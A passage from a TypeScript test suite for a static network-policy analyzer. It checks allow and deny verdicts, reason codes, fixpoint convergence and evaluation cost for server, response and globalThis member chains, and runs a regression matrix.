      `typeof globalThis.valueOf?.();`,
      `globalThis.valueOf?.().console.log('x');`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
    }
  });

  it('preserves allowed chains, statement-position results and eligible propagation', () => {
    for (const source of [
      withServer(`server.listen(1).close();`),
      inListener(`response.setHeader('a', 'b').end('x');`),
      withServer(`void server.listen(1);`),
      withServer(`server.listen(4317, '127.0.0.1', () => { console.log('up'); });`),
      withServer(`function setup(s: http.Server) { s.close(); }\nsetup(server.listen(1));`),
      withServer(`const started = server.listen(1);\nstarted.close();`),
      `globalThis.console.log('x');`,
      `globalThis.valueOf();`,
      `globalThis.valueOf().console.log('x');`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
      expect(result.verdict, source).toBe('ALLOW');
    }
  });

  it('establishes SERVER authority on a const alias of a listen result as ALIAS, converging within the derived bound', () => {
    const rooted = factsOfConst(withServer(`const leaked = server.listen(1);\nleaked.close();`), 'leaked');
    expect(rooted.facts).toEqual(['SERVER:ALIAS']);
    expect(rooted.result.fixpoint.state).toBe('CONVERGED');
    expect(rooted.result.fixpoint.iterations).toBeLessThanOrEqual(rooted.bound);
    expect(rooted.result.fixpoint.bound).toBe(rooted.bound);
    expect(rooted.result.verdict, describeFindings(rooted.result)).toBe('ALLOW');

    const direct = factsOfConst(`${NS}\nconst leaked = http.createServer(${L}).listen(1);\nleaked.close();`, 'leaked');
    expect(direct.facts).toEqual(['SERVER:ALIAS']);
    expect(direct.result.fixpoint.state).toBe('CONVERGED');

    const chained = factsOfConst(withServer(`const a = server.listen(1);\nconst b = a.close();\nb.close();`), 'b');
    expect(chained.facts).toEqual(['SERVER:ALIAS']);
    expect(chained.result.fixpoint.state).toBe('CONVERGED');
    expect(chained.result.fixpoint.iterations).toBeLessThanOrEqual(chained.bound);

    const viaParam = factsOfConst(withServer(`function setup(s: http.Server) { const t = s.listen(1); t.close(); }\nsetup(server);`), 't');
    expect(viaParam.facts).toEqual(['SERVER:PARAM']);
    expect(viaParam.result.fixpoint.state).toBe('CONVERGED');

    const response = factsOfConst(inListener(`const r2 = response.setHeader('a', 'b');\nr2.end();`), 'r2');
    expect(response.facts).toEqual(['RESPONSE:ALIAS']);
  });

  it('does not let optional calls enter the direct-call rule: the existing member policy already denies them', () => {
    const optionalCall = inspectNetworkPolicy(withServer(`const x = server.listen?.(1);\nuse(x);`));
    const declaration = collectNodes(optionalCall.sourceFile, ts.isVariableDeclaration).find((d) => ts.isIdentifier(d.name) && d.name.text === 'x');
    const symbol = declaration === undefined ? undefined : optionalCall.valueSymbolOf(declaration.name);
    expect(symbol && optionalCall.factsOf(symbol)).toEqual([]);
    expect(optionalCall.result.reasons).toEqual(['SERVER_MEMBER']);
    for (const [source, reason] of [
      [withServer(`server.listen?.(1).on('x', () => {});`), 'SERVER_MEMBER'],
      [withServer(`server?.listen(1).on('x', () => {});`), 'SERVER_MEMBER'],
      [inListener(`response.end?.('x').socket;`), 'RESPONSE_MEMBER'],
    ] as const) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, source).toEqual([reason]);
      expect(result.findings, source).toHaveLength(1);
    }
  });

  it('keeps computed/indeterminate keys on their existing verdicts without a second finding', () => {
    const server = analyzeNetworkPolicy(withServer(`declare const k: string;\nserver[k]().on('x', () => {});`));
    expect(server.reasons).toEqual(['SERVER_MEMBER']);
    expect(server.findings).toHaveLength(1);
    const global = analyzeNetworkPolicy(`declare const k: string;\nglobalThis[k]().fetch('x');`);
    expect(global.reasons).toEqual(['GLOBAL_RECEIVER_RUNTIME_KEY']);
    expect(global.findings).toHaveLength(1);
    const overLong = analyzeNetworkPolicy(withServer(`server['listenButMuchLongerThanAnyPolicyName']().on('x', () => {});`));
    expect(overLong.reasons).toEqual(['SERVER_MEMBER']);
    expect(overLong.findings).toHaveLength(1);
  });

  it('gives user-defined methods no authority unless their receiver already carries it', () => {
    for (const source of [
      withServer(`const o = { listen: () => ({ on: (x: string) => x }) };\no.listen().on('x');\nserver.close();`),
      inListener(`const box = { end: () => ({ socket: 1 }) };\nbox.end().socket;\nresponse.end();`),
      `const self = { valueOf: () => ({ fetch: 1 }) };\nconst v = self.valueOf();\nv.fetch;`,
      `${NS}\nfunction other(request: any, response: any) { request.url().socket; response.end().socket; }`,
    ]) {
      const result = analyzeNetworkPolicy(source);
      expect(result.reasons, `${source}\n${describeFindings(result)}`).toEqual([]);
    }
    const carried = analyzeNetworkPolicy(withServer(`function setup(s: http.Server) { s.listen(1).on('x', () => {}); }\nsetup(server);`));
    expect(carried.reasons).toEqual(['SERVER_MEMBER']);
  });

  it('leaves the existing escape rules effective', () => {
    for (const [source, reason] of [
      [withServer(`use(server);`), 'SERVER_ESCAPE'],
      [inListener(`const box = { request };`), 'REQUEST_ESCAPE'],
      [inListener(`use(response);`), 'RESPONSE_ESCAPE'],
      [`const g = globalThis;`, 'GLOBAL_RECEIVER_ESCAPE'],
      [`use(self);`, 'GLOBAL_RECEIVER_ESCAPE'],
    ] as const) {
      expect(analyzeNetworkPolicy(source).reasons, source).toEqual([reason]);
    }
  });

  it('evaluates receiver facts once per chain level: long allowed chains stay polynomial, correct and CONVERGED', () => {
    // Receiver-call result authority inheritance once recomputed the receiver's
    // facts at every level (2^depth evaluations for `server.close().close()...`).
    // `inheritingReceiverOf` now computes them exactly once and `expressionFacts`
    // consumes that result, so one evaluation is linear in chain depth and
    // classifying every nested call node of a depth-n chain is O(n^2) overall.
    // The witness is the deterministic evaluation counter, not wall-clock time.
    const DEPTHS = [8, 16, 24];
    const chains: Record<string, (depth: number) => string> = {
      server: (depth) => withServer(`server${'.close()'.repeat(depth)};`),
      response: (depth) => inListener(`response${".setHeader('a', 'b')".repeat(depth)};`),
    };
    for (const [name, build] of Object.entries(chains)) {
      for (const depth of DEPTHS) {
        const label = `${name} chain depth ${String(depth)}`;
        const inspection = inspectNetworkPolicy(build(depth));
        expect(inspection.result.reasons, label).toEqual([]);
        expect(inspection.result.verdict, label).toBe('ALLOW');
        expect(inspection.result.fixpoint.state, label).toBe('CONVERGED');
        expect(inspection.result.fixpoint.iterations, label).toBeLessThanOrEqual(inspection.fixpointBound);
        // Polynomial ceiling, and strictly below the exponential floor of per-level re-evaluation.
        expect(inspection.expressionFactsEvaluations, label).toBeLessThanOrEqual((depth + 3) ** 2);
        expect(inspection.expressionFactsEvaluations, label).toBeLessThan(2 ** depth);
        // One more level costs at most a linear number of extra evaluations.
        const deeper = inspectNetworkPolicy(build(depth + 1));
        expect(deeper.expressionFactsEvaluations - inspection.expressionFactsEvaluations, label).toBeGreaterThan(0);
        expect(deeper.expressionFactsEvaluations - inspection.expressionFactsEvaluations, label).toBeLessThanOrEqual(4 * depth);
        // Deterministic: the same source always costs the same number of evaluations.
        expect(inspectNetworkPolicy(build(depth)).expressionFactsEvaluations, label).toBe(inspection.expressionFactsEvaluations);
      }
    }
    // Verdict semantics are unchanged at the end of a long chain: one finding, existing reason codes.
    const deniedServer = analyzeNetworkPolicy(withServer(`server${'.close()'.repeat(24)}.on('x', () => {});`));
    expect(deniedServer.reasons, describeFindings(deniedServer)).toEqual(['SERVER_MEMBER']);
    expect(deniedServer.findings).toHaveLength(1);
    expect(deniedServer.fixpoint.state).toBe('CONVERGED');
    const deniedResponse = analyzeNetworkPolicy(inListener(`response${".end('x')".repeat(24)}.socket;`));
    expect(deniedResponse.reasons, describeFindings(deniedResponse)).toEqual(['RESPONSE_MEMBER']);
    expect(deniedResponse.findings).toHaveLength(1);
    const tail = factsOfConst(withServer(`const tail = server${'.close()'.repeat(24)};\ntail.close();`), 'tail');
    expect(tail.facts).toEqual(['SERVER:ALIAS']);
    expect(tail.result.verdict, describeFindings(tail.result)).toBe('ALLOW');
    expect(tail.result.fixpoint.state).toBe('CONVERGED');
    expect(tail.result.fixpoint.iterations).toBeLessThanOrEqual(tail.bound);
    // The fixpoint still fail-closes on a chain when the ceiling is reached.
    const exhausted = analyzeNetworkPolicy(withServer(`server${'.close()'.repeat(24)};`), { fixpointCeiling: 1 });
    expect(exhausted.fixpoint).toEqual({ state: 'EXHAUSTED', iterations: 1, bound: 1 });
    expect(exhausted.reasons).toEqual(['FIXPOINT_EXHAUSTED']);
    // The counter sits at the entry of the single expression-authority lookup.
    expect(occurrences(readFileSync(detectorPath, 'utf8'), 'expressionFactsEvaluations += 1')).toBe(1);
  });

  it('is structural: one expression-authority lookup, no member-name special cases', () => {
    const detector = readFileSync(detectorPath, 'utf8');
    expect(occurrences(detector, 'function expressionFacts(')).toBe(1);
    expect(occurrences(detector, 'function inheritingReceiverOf(')).toBe(1);
    expect(occurrences(detector, 'function classesOf(')).toBe(1);
    expect(occurrences(detector, 'factsOf(ctx, valueSymbolOf(')).toBe(1);
    // The optional-call follow is confined to the global-receiver path; target classes keep the direct-call predicate.
    expect(occurrences(detector, 'const memberCallOf = ')).toBe(1);
    expect(occurrences(detector, 'memberCallOf(parent)')).toBe(1);
    expect(occurrences(detector, 'inheritingReceiverOf(ctx, ')).toBe(1);
    for (const forbidden of ['valueOf', 'toString', 'EventSource', 'receiverPreserving', 'RETURNS_THIS']) {
      expect(occurrences(detector, forbidden), forbidden).toBe(0);
    }
    expect(POLICY_KEY_NAMES).not.toContain('valueOf');
  });
});

// ---------------------------------------------------------------------------
// Real host
// ---------------------------------------------------------------------------

describe('D3 network policy accepts the real Stage-A host', () => {
  it('allows every real host source file', () => {
    const files = readdirSync(hostDir, { recursive: true })
      .map((entry) => String(entry))
      .filter((name) => name.endsWith('.ts'));
    expect(files).toContain('server.ts');
    for (const file of files) {
      const result = analyzeNetworkPolicy(readFileSync(join(hostDir, file), 'utf8'));
      expect(result.fixpoint.state, file).toBe('CONVERGED');
      expect(result.verdict, `${file}: ${describeFindings(result)}`).toBe('ALLOW');
    }
  });

  it('proves the real server.ts through the intended mechanisms', () => {
    const inspection = inspectNetworkPolicy(readFileSync(join(hostDir, 'server.ts'), 'utf8'));
    const [factory] = identifiersNamed(inspection.sourceFile, 'createCockpitServer');
    const factorySymbol = factory === undefined ? undefined : inspection.valueSymbolOf(factory);
    expect(factorySymbol && inspection.isConfinedFactory(factorySymbol)).toBe(true);
    const parameters = collectNodes(inspection.sourceFile, ts.isParameter);
    const factsByName = new Map<string, readonly string[]>();
    for (const parameter of parameters) {
      if (!ts.isIdentifier(parameter.name)) continue;
      const symbol = inspection.valueSymbolOf(parameter.name);
      if (symbol !== undefined) factsByName.set(`${parameter.name.text}@${String(parameter.pos)}`, inspection.factsOf(symbol));
    }
    const facts = [...factsByName.values()].filter((list) => list.length > 0).map((list) => list.join(','));
    expect(facts.sort()).toEqual(['REQUEST:ROOT', 'RESPONSE:PARAM', 'RESPONSE:ROOT']);
  });
});

// ---------------------------------------------------------------------------
// Regression matrix
// ---------------------------------------------------------------------------

describe('D3 network policy semantic regression matrix', () => {
  it('covers every frozen category with at least one MUST_DENY or MUST_ALLOW row', () => {
    for (const category of REGRESSION_CATEGORIES) {
      const rows = D3_REGRESSION_MATRIX.filter((row) => row.category === category && row.expectation !== 'OUTSIDE_DECLARED_BOUNDARY');
      expect(rows.length, category).toBeGreaterThan(0);
    }
  });

  it('has unique row names within each category', () => {
    const seen = new Set<string>();
    for (const row of D3_REGRESSION_MATRIX) {
      const key = `${row.category}::${row.name}`;
      expect(seen.has(key), key).toBe(false);
      seen.add(key);
    }
  });

  it('closes every PR #64 finding F-1 through F-7 with at least one row', () => {
    const closed = new Set(D3_REGRESSION_MATRIX.flatMap((row) => row.closes ?? []));
    expect([...closed].sort()).toEqual(['F-1', 'F-2', 'F-3', 'F-4', 'F-5', 'F-6', 'F-7']);
  });

  const byCategory = new Map<string, RegressionRow[]>();
  for (const row of D3_REGRESSION_MATRIX) {
    const rows = byCategory.get(row.category) ?? [];
    rows.push(row);
    byCategory.set(row.category, rows);
  }

  for (const [category, rows] of byCategory) {
    describe(category, () => {
      for (const row of rows) {
        const label = `${row.expectation}: ${row.name}`;
        it(label, () => {
          const result = analyzeNetworkPolicy(row.source, row.options ?? {});
          const detail = `${row.source}\n--> ${describeFindings(result)} [${result.fixpoint.state}]`;
          switch (row.expectation) {
            case 'MUST_DENY':
              expect(result.verdict, detail).toBe('DENY');
              for (const reason of row.reasons ?? []) expect(result.reasons, detail).toContain<ReasonCode>(reason);
              break;
            case 'MUST_ALLOW':
              expect(result.reasons, detail).toEqual([]);
              expect(result.verdict, detail).toBe('ALLOW');
              expect(result.fixpoint.state, detail).toBe('CONVERGED');
              break;
            case 'OUTSIDE_DECLARED_BOUNDARY':
              expect(['ALLOW', 'DENY']).toContain(result.verdict);
              break;
          }
        });
      }
    });
  }
});
